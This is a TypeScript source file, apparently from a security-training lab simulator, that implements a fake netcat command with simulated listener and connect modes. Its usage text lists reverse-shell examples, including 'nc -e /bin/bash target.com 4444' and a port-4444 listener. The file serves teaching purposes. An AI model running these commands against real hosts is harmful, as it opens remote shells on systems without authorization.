// ── commands/tools/nc.ts ───────────────────────────────────────────
// Netcat (nc) - Network utility for reading and writing data across networks
// Parseo en frameworks/shells/nc/ncArgs.ts (compartido con NcSession).

import type { CommandContext, CommandResponse } from '../../types';
import { parseNcListener, parseNcConnect, resolveNcConnect } from '../../frameworks/shells/nc/ncArgs';

export const cmd_nc = {
  name: 'nc',
  execute: (args: string[], context: CommandContext): CommandResponse => {
    // Validar argumentos mínimos
    if (args.length === 0) {
      return {
        output: `usage: nc [-options] hostname port
       nc -l [-options] port

General options:
  -l              Listen for incoming connection
  -n              Don't perform DNS lookups
  -v              Verbose (print commands before executing)
  -u              UDP mode (no handshake)
  -e prog         Execute program on connect (e.g. /bin/bash)
  -p port         Specify port

Examples:
  nc -nlvp 4444           Listen on port 4444 (common for reverse shells)
  nc -lvnp 4444           (same, different order)
  nc target.com 80        Connect to target.com on port 80
  nc -l -p 9999           Listen on port 9999 (without verbose)
  nc -e /bin/bash target.com 4444   Reverse shell payload`,
        isError: false,
      };
    }

    // Parsear modo listener con soporte a cualquier orden de argumentos
    const listenerResult = parseNcListener(args);

    if (listenerResult.isListener) {
      if (listenerResult.error) {
        return {
          output: listenerResult.error,
          isError: true,
        };
      }

      const port = listenerResult.port!;

      // nc ahora es un comando libre - solo reporta que inició el listener
      // El labValidator detectará el blockingCommand y validará la misión
      return {
        output: `listening on [any] ${port} ...`,
        type: 'blocking',
        isError: false,
        blockingCommand: {
          message: `⏳ Escuchando en puerto ${port}... Presiona Ctrl+C para cancelar`,
          listeningPort: port,
        },
      };
    }

    // Modo de conexión: el estado del puerto virtual manda
    const outcome = resolveNcConnect(parseNcConnect(args), context);
    return { output: outcome.output, isError: outcome.isError ? true : undefined };
  },
};
